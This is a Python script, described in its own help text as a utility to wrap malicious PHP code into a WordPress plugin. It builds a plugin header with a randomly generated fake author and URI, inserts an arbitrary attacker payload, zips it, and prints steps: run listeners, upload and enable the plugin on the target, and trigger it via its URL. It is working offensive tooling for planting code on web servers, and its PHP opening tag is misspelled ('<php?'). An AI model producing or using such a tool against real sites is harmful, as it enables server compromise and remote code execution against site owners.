#! /usr/bin/env python3

import os
import argparse
import random
import random_name_generator as rng
import zipfile

ZIP_NAME = "plugin.zip"
SCRIPT_NAME = "plugin.php"

def create_script(plugin_name, author_name, payload):
    domain = author_name.replace(" ", "")
    script =  f"<php?\n"
    script += f"/**\n"
    script += f"* Plugin Name: {plugin_name}\n"
    script += f"* Version: {random.randint(1, 10)}.{random.randint(1, 5)}.{random.randint(1, 100)}\n"
    script += f"* Author: {author_name}\n"
    script += f"* Author URI: https://www.{domain}.com\n"
    script += f"* License: MIT\n"
    script += f"*/\n"
    script += f"{payload}"
    script += f"?>\n"
    return script

def write_file(file_name, data):
    script_file = open(file_name, "w")
    script_file.write(data)
    script_file.close()

def package_plugin(script, script_name, zip_name):
    write_file(script_name, script)
    zip_file = zipfile.ZipFile(zip_name, "w")
    zip_file.write(script_name)
    zip_file.close()
    os.remove(script_name)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="a simple utility to wrap malicious PHP code into a WordPress plugin")
    parser.add_argument("-n", "--name", type=str, required=True, dest="name", help="plug-in name; needs to be unique on the target")
    parser.add_argument("-p", "--payload", type=str, required=True, dest="payload", help="PHP payload to be wrapped into the plug-in")
    args = parser.parse_args()
    plugin_name = args.name
    payload = args.payload
    try:
        author_name = rng.generate(descent=rng.Descent.ENGLISH, sex=rng.Sex.MALE, limit=1)[0]
        script = create_script(plugin_name, author_name, payload)
        package_plugin(script, SCRIPT_NAME, ZIP_NAME)
        print()
        print("plugin created successfully")
        print("0. ensure any necessary listeners are running")
        print("1. upload the plugin and ensure it is enabled")
        print("2. trigger the plugin by navigating to the plugin file:")
        print(f"\thttp(s)://<target>/wp-content/plugins/{plugin_name}/{SCRIPT_NAME}")
        print()
    except Exception as ex:
        print(f"there was an issue creating the plug-in\n{ex}")